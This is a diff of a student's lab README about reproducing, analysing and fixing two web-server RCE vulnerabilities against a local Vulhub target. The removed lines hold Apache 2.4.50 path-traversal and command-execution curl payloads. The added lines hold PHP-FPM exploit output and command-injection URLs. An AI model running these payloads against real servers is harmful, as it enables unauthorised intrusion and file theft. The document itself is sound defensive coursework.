@@ -1,12 +1,12 @@
-# Work 1 — Secure REST API + CI/CD Security Scanning + CVE-2021-42013 Reproduction & Fix
+# Work 1 — Secure REST API + CI/CD Security Scanning + CVE-2019-11043 Reproduction & Fix
 
 Author: **Chen Yiming, HDU 23320218**.
 
 This repository contains two parts:
 
 1. **`/` (root)** — a hardened Flask REST API with OWASP Top-10 baseline protections, plus a GitHub Actions pipeline that runs SAST + SCA on every push.
-2. **`/cve-2021-42013`** — reproduction, root-cause analysis, fix and verification of **CVE-2021-42013** (Apache HTTP Server 2.4.50 path traversal → RCE) from Vulhub.
-3. *Appendix:* `/cve-ssti` — an additional Vulhub environment (Flask SSTI → RCE) that I studied before settling on CVE-2021-42013; kept here as supplementary material.
+2. **`/cve-2019-11043`** — reproduction, root-cause analysis, fix and verification of **CVE-2019-11043** (PHP-FPM 7.2 path-info buffer underflow → RCE behind nginx) from Vulhub.
+3. *Appendix:* `/cve-ssti` — an additional Vulhub environment (Flask SSTI → RCE) that I studied before settling on CVE-2019-11043; kept here as supplementary material.
 
 ---
 
@@ -86,104 +86,111 @@ Triggers on **every push / pull request**:
 
 ---
 
-## Part 2 — CVE-2021-42013: Reproduction, Root Cause & Fix
+## Part 2 — CVE-2019-11043: Reproduction, Root Cause & Fix
 
 ### Chosen vulnerability
 
-**CVE-2021-42013 — Apache HTTP Server 2.4.49/2.4.50 path traversal and file disclosure (→ RCE with CGI enabled).**
+**CVE-2019-11043 — PHP-FPM (PHP 7.1.x < 7.1.33, 7.2.x < 7.2.24, 7.3.x < 7.3.11) path-info buffer underflow → unauthenticated RCE when deployed behind nginx with a `fastcgi_split_path_info` config that can pass an empty `PATH_INFO`.**
 
-- **What it is**: the fix for CVE-2021-41773 shipped in Apache 2.4.50 was incomplete. An attacker can map URLs to files outside the directories configured by Alias-like directives (`Require all denied` not in effect), reading arbitrary files; with `mod_cgi`/`mod_cgid` enabled the same flaw allows arbitrary command execution.
-- **Severity**: CVSS 3.1 **9.8 Critical** (NVD). Actively exploited in the wild in late 2021.
-- **Affects**: Apache HTTP Server 2.4.49 and 2.4.50 only; fixed in **2.4.51**.
-- **CWE**: CWE-22 (Path Traversal) → CWE-78 (OS Command Injection via CGI).
+- **What it is**: when nginx passes a `PATH_INFO` FastCGI parameter whose value is **empty**, php-fpm's `init_request_info()` performs unchecked pointer arithmetic that underflows the FastCGI params buffer; the resulting out-of-bounds write primitive lets an attacker corrupt the memory layout so that part of a later FastCGI request is reinterpreted as **`PHP_VALUE` ini settings** (`allow_url_include=On`, `auto_prepend_file=php://input`), which executes the HTTP request body as PHP code.
+- **Severity**: CVSS 3.1 **9.8 Critical** (NVD; the PHP Group as CNA rates it 8.7 High due to the `AC:H` configuration prerequisite). Actively exploited; present in CISA KEV.
+- **Affects**: PHP 7.1.x below 7.1.33, 7.2.x below 7.2.24, 7.3.x below 7.3.11, in certain FPM + nginx configurations; fixed in **7.1.33 / 7.2.24 / 7.3.11**.
+- **CWE**: CWE-120 (Classic Buffer Overflow).
+- **Reported by**: Emil Lerner (PHP bug #78599); reference exploit `neex/phuip-fpizdam`.
 
 ### Environment
 
-Vulhub `httpd/CVE-2021-42013`: builds `vulhub/httpd:2.4.50` with `mod_cgi`/`mod_cgid` enabled and `<Directory /> Require all granted`, published on port 8080.
+Vulhub `php/CVE-2019-11043`: an `nginx:1` service proxying to `vulhub/php:7.2.10-fpm`, with the stock misconfiguration `fastcgi_split_path_info ^(.+?\.php)(/.*)$` + `fastcgi_param PATH_INFO $fastcgi_path_info;` (which can send an empty `PATH_INFO`), published on port 8080.
 
-![vulnerable target running](https://gcore.jsdelivr.net/gh/ChenYiming-aaa/network-security-work1@main/cve-2021-42013/evidence/docker-target-running.png)
-*`docker compose up -d` — container `cve-2021-42013-apache-1` Up, `Server: Apache/2.4.50 (Unix)`, port 8080→80.*
+```
+$ cd vulhub/php/CVE-2019-11043 && docker compose up -d
+$ docker ps
+cve-2019-11043-nginx-1  nginx:1               Up  0.0.0.0:8080->80/tcp
+cve-2019-11043-php-1    vulhub/php:7.2.10-fpm Up  9000/tcp
+```
+
+Raw output: `cve-2019-11043/evidence/reproduce_before_fix.log`.
 
 ### Reproduction (before fix)
 
-All requests were sent with `curl --path-as-is` (curl does not normalize the path; the browser address bar also worked). Raw output: `cve-2021-42013/evidence/reproduce_before_fix.log`.
+Sanity check first: `curl -i http://localhost:8080/index.php` returns `HTTP 200` (`Server: nginx/1.31.7`, `X-Powered-By: PHP/7.2.10`) with the script's `hello world` output.
 
-```bash
-cd vulhub/httpd/CVE-2021-42013 && docker compose up -d
+The exploit is `neex/phuip-fpizdam` (the reference implementation for this CVE). It runs in two phases:
 
-# A0 sanity check
-curl -i http://localhost:8080/                                    # -> It works!
+1. **QSL detection** — probe `/PHP%0A….php?` + `Q`×n and record the query-string lengths that make the server answer `502` (those are the memory layouts where the underflowed write kills the worker):
 
-# A1 path traversal: read /etc/passwd (doubly-encoded dots bypass the 2.4.50 patch)
-curl -i --path-as-is "http://localhost:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
-# -> HTTP 200 + full /etc/passwd
-
-# A2 RCE: traverse into /bin/sh and let CGI feed it the request body
-curl -i --path-as-is --data "echo;id" \
-  "http://localhost:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
-# -> uid=1(daemon) gid=1(daemon) groups=1(daemon)
-
-# A3 arbitrary file read via the shell
-curl -s --path-as-is --data "echo;head -n1 /etc/passwd" \
-  "http://localhost:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
-# -> root:x:0:0:root:/root:/bin/bash
+```
+2026/10/20 11:21:45 Base status code is 200
+2026/10/20 11:21:46 The target is probably vulnerable. Possible QSLs: [1790 1795 1800]
 ```
 
-**Screenshot — file disclosure (before fix):**
+2. **Attack** — with the right QSL and a path-info size offset, the zero-byte write lands where a later FastCGI param block is reinterpreted as `PHP_VALUE` (`allow_url_include=On`, `auto_prepend_file=php://input`), and the tool confirms code execution:
 
-![path traversal before fix](https://gcore.jsdelivr.net/gh/ChenYiming-aaa/network-security-work1@main/cve-2021-42013/evidence/before-fix-traversal.png)
-*Browser on 2.4.50: a traversal URL under `/icons/` returns the container's `/etc/passwd` — a file far outside the document root.*
+```
+2026/10/20 11:21:48 Attack params found: --qsl 1795 --pisos 248 --skip-detect
+2026/10/20 11:21:49 Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&" to URLs
+```
+
+After a successful attack, commands run by appending `?a=/bin/sh+-c+'<cmd>'&` to any URL. Because php-fpm pools several workers and only a **poisoned** worker executes the injected settings, each probe is retried until a poisoned worker answers:
+
+```bash
+curl "http://localhost:8080/index.php?a=/bin/sh+-c+'whoami'&"      # -> www-data
+curl "http://localhost:8080/index.php?a=/bin/sh+-c+'id'&"          # -> uid=33(www-data) gid=33(www-data) groups=33(www-data)
+curl "http://localhost:8080/index.php?a=/bin/sh+-c+'head+-n1+/etc/os-release'&"
+# -> PRETTY_NAME="Debian GNU/Linux 9 (stretch)"
+```
 
 **Screenshot — RCE (before fix):**
 
-![RCE before fix](https://gcore.jsdelivr.net/gh/ChenYiming-aaa/network-security-work1@main/cve-2021-42013/evidence/before-fix-rce.png)
-*The CGI traversal payload executes `id` on the server: `uid=1(daemon) gid=1(daemon) groups=1(daemon)`.*
+![RCE before fix](https://gcore.jsdelivr.net/gh/ChenYiming-aaa/network-security-work1@main/cve-2019-11043/evidence/before-fix-rce.png)
+*The exploit URL rendered in a browser session: the `id` command executed on the server — `uid=33(www-data) gid=33(www-data) groups=33(www-data)` — followed by the normal script output. Raw transcript: `cve-2019-11043/evidence/reproduce_before_fix.log`.*
 
 ### Root cause analysis
 
-Full write-up: **`cve-2021-42013/root-cause-analysis.md`**. In my own words, short version:
+Full write-up: **`cve-2019-11043/root-cause-analysis.md`**. In my own words, short version:
 
-The bug is a **decode-after-check ordering flaw**. Apache validates the request path (the traversal check) on one representation of the URL, but the filesystem mapping happens later, on a more fully-decoded representation. The 2.4.50 patch tried to close CVE-2021-41773 by blacklisting the *known spellings* of `..` (`%2e%2e`, `.%2e`) instead of fixing the ordering — so a spelling that only becomes `..` after a *second* decode pass, `.%%32%65` → `.%2e` → `..`, sailed through the check again. Same bug, new spelling.
+The bug is an **unchecked pointer arithmetic on an empty `PATH_INFO` value** — a path-info buffer underflow. nginx still passes a `PATH_INFO` FastCGI parameter when `fastcgi_split_path_info` captures nothing (value empty); php-fpm assumed "the parameter exists" implies "the URL really is `script.php/pathinfo`" and computed the path-info pointer by subtracting the script-path length from a pointer into the FastCGI params buffer. With an empty value, the result points **before the start of the buffer**, and a subsequent write goes out of bounds. The attacker tunes the request size (query-string length — hence the QSL probing phase) to control where the write lands, realigns the heap so that a later request's FastCGI parameters are interpreted as **`PHP_VALUE` ini settings**, injects `allow_url_include=On` + `auto_prepend_file=php://input`, and turns the HTTP body into executed PHP — unauthenticated RCE as the php-fpm user.
 
-Two configuration choices in the environment turn file disclosure into RCE: `mod_cgi` is enabled (so the traversed URL can point at `/bin/sh`, which executes the request body), and the stock `<Directory /> Require all denied` default was rewritten to `Require all granted` (so traversed files outside the docroot are actually served). Code defect provides the traversal; configuration decides the blast radius.
+The misconfiguration is what makes the trigger reachable (an empty `PATH_INFO` must actually reach php-fpm), and the code defect is what turns it into memory corruption: configuration decides reachability, the missing bounds check decides the impact.
 
 ### Fix
 
-Files changed: `cve-2021-42013/fix/Dockerfile` and `cve-2021-42013/fix/docker-compose.yml` (the vulnerable originals are archived in `cve-2021-42013/fix/original/` for comparison).
+Files changed: `cve-2019-11043/fix/docker-compose.yml` (the vulnerable originals are archived in `cve-2019-11043/fix/original/` for comparison).
 
-**Primary fix — upgrade the image to the version where the CVE is fixed**: `FROM vulhub/httpd:2.4.50` → `FROM httpd:2.4.51` (2.4.51 contains the upstream revisions r1893977/r1893980/r1893982 that fully decode and normalize the path *before* validating it). The CGI/`Require all granted` configuration is deliberately kept identical to the vulnerable image — that way the verification below proves the attack dies because of the version fix itself, not because I hardened the environment.
+**Primary fix — upgrade the PHP image to the version where the CVE is fixed**: `image: vulhub/php:7.2.10-fpm` → `image: php:7.2.24-fpm` (7.2.24 contains the upstream fix for PHP bug #78599: `init_request_info()` now validates that the `PATH_INFO` value is consistent with the script filename before doing any pointer arithmetic, so the empty-`PATH_INFO` case can no longer produce an out-of-bounds pointer). The nginx service and the `default.conf` (including the misconfigured `fastcgi_split_path_info` block) are deliberately kept **identical** to the vulnerable environment — that way the verification below proves the attack dies because of the version fix itself, not because I hardened the configuration.
 
-Defence-in-depth recommendations for a real deployment (not applied to the lab image on purpose): keep `Require all denied` as the default for everything outside the docroot, enable CGI only where genuinely needed, and pin images by digest — 2.4.51 itself was superseded within weeks by 2.4.52 (CVE-2021-44790), which is a good reminder that "upgrade to the fixed version" means "upgrade to the *current* version".
+Defence-in-depth recommendations for a real deployment (not applied to the lab image on purpose): don't pass `PATH_INFO` when it can be empty (tighten the regex or add a `try_files $fastcgi_script_name =404;` guard), set `cgi.fix_pathinfo=0` if the app doesn't use path-info URLs, run php-fpm with least privileges, and pin images by digest — the floating `nginx:1` tag silently drifts (it resolved to nginx 1.31.7 here).
 
-Applied with the standard cycle (`docker compose down` → edit Dockerfile → `docker compose up --build -d`). Raw output: [`cve-2021-42013/evidence/fix_applied.log`](https://gcore.jsdelivr.net/gh/ChenYiming-aaa/network-security-work1@main/cve-2021-42013/evidence/fix_applied.log) — the image rebuilds, `docker ps` shows the container Up, and the banner is now `Apache/2.4.51 (Unix)`.
+Applied with the standard cycle (`docker compose down` → edit `fix/docker-compose.yml` → `docker compose up -d`). Raw output: [`cve-2019-11043/evidence/verify_after_fix.log`](https://gcore.jsdelivr.net/gh/ChenYiming-aaa/network-security-work1@main/cve-2019-11043/evidence/verify_after_fix.log) — `docker ps` shows the container Up and the banner is now `X-Powered-By: PHP/7.2.24`.
 
 ### Verification after fix (attack replay + regression)
 
-The exact same payloads from step A1–A3 were replayed against 2.4.51. Raw output: `cve-2021-42013/evidence/verify_after_fix.log`.
+The exact same payloads were replayed against PHP 7.2.24. Raw output: `cve-2019-11043/evidence/verify_after_fix.log`.
 
-| Replay | Before fix (2.4.50) | After fix (2.4.51) |
+| Replay | Before fix (PHP 7.2.10) | After fix (PHP 7.2.24) |
 |---|---|---|
-| V1 = A1 traversal to `/etc/passwd` | HTTP 200 + file contents | **HTTP 400 Bad Request — rejected** |
-| V2 = A2 CGI RCE (`id`) | `uid=1(daemon)…` | **HTTP 400 — rejected** |
-| V3 = A3 CGI file read | `root:x:0:0:root…` | **HTTP 400 — rejected** |
+| V1 `id` via `?a=/bin/sh+-c+'id'&` | `uid=33(www-data)…` | **`hello world` only — no command output (HTTP 200), 8/8 tries** |
+| V2 `whoami` | `www-data` | **no command output** |
+| V3 `head -n1 /etc/os-release` | `PRETTY_NAME="Debian GNU/Linux 9 (stretch)"` | **no command output** |
+| V4 PoC detection phase (`phuip-fpizdam --only-qsl`) | `Possible QSLs: [1790 1795 1800]` — vulnerable | **`no qsl candidates found, invulnerable`** |
 
-Regression tests: `GET /` still returns `It works!` (200), the aliased `/icons/` directory still serves content (200), normal static files still served (200). Normal functionality is fully preserved.
+Regression tests: `GET /index.php` still returns `hello world` (200, `X-Powered-By: PHP/7.2.24`). Normal functionality is fully preserved.
 
 **Screenshot — attack rejected after fix:**
 
-![after fix rejected](https://gcore.jsdelivr.net/gh/ChenYiming-aaa/network-security-work1@main/cve-2021-42013/evidence/after-fix-rejected.png)
-*The same traversal URL that disclosed `/etc/passwd` on 2.4.50 now returns 400 Bad Request on 2.4.51.*
+![after fix rejected](https://gcore.jsdelivr.net/gh/ChenYiming-aaa/network-security-work1@main/cve-2019-11043/evidence/after-fix-rejected.png)
+*The exact URL that executed `id` on PHP 7.2.10 now returns only the normal script output — the injected `PHP_VALUE` settings are gone with the bounds check.*
 
 **Screenshot — regression, normal page still works:**
 
-![after fix regression](https://gcore.jsdelivr.net/gh/ChenYiming-aaa/network-security-work1@main/cve-2021-42013/evidence/after-fix-regression.png)
-*`http://localhost:8080/` on the fixed server still returns the default page.*
+![after fix regression](https://gcore.jsdelivr.net/gh/ChenYiming-aaa/network-security-work1@main/cve-2019-11043/evidence/regression-ok.png)
+*`http://localhost:8080/index.php` on the fixed server still returns the normal `hello world` page.*
 
 ---
 
 ## Appendix — extra environment studied (`/cve-ssti`)
 
-Before choosing CVE-2021-42013 I reproduced an SSTI → RCE chain on the Vulhub `flask/ssti` environment (`{{233*233}}` → `54289`, gadget chain → `uid=33(www-data)`), analysed it (code/data confusion in `Template("Hello " + name)`) and fixed it (template-as-constant + input whitelist). Materials: `cve-ssti/` (evidence, `root-cause-analysis.md`, fix patch and layered verification). It is included as supplementary work; the graded CVE for this lab is **CVE-2021-42013** above.
+Before choosing CVE-2019-11043 I reproduced an SSTI → RCE chain on the Vulhub `flask/ssti` environment (`{{233*233}}` → `54289`, gadget chain → `uid=33(www-data)`), analysed it (code/data confusion in `Template("Hello " + name)`) and fixed it (template-as-constant + input whitelist). Materials: `cve-ssti/` (evidence, `root-cause-analysis.md`, fix patch and layered verification). It is included as supplementary work; the graded CVE for this lab is **CVE-2019-11043** above.
 
 **Before fix (vulnerable app mounted):** `/?name={{233*233}}` is evaluated server-side, and the Jinja2 gadget chain executes `id` on the server:
 
@@ -226,9 +233,9 @@ The formal lab report — title page (lab number and title, variant, Surname and
 | Public Git repository | https://github.com/ChenYiming-aaa/network-security-work1 |
 | This README | `README.md` |
 | CI pipeline link (last successful run) | https://github.com/ChenYiming-aaa/network-security-work1/actions/runs/39275027221 |
-| Fixed files folder | `cve-2021-42013/fix/` (`Dockerfile`, `docker-compose.yml`, originals in `fix/original/`) |
-| CVE reproduction & verification evidence | `cve-2021-42013/evidence/` (logs + screenshots) |
-| Root cause analysis | `cve-2021-42013/root-cause-analysis.md` |
+| Fixed files folder | `cve-2019-11043/fix/` (`docker-compose.yml`, original in `fix/original/`) |
+| CVE reproduction & verification evidence | `cve-2019-11043/evidence/` (logs + screenshots) |
+| Root cause analysis | `cve-2019-11043/root-cause-analysis.md` |
 | Formal course report | `report/Work1_Report_Chen_Yiming_23320218.docx` |
 
 ## Notes
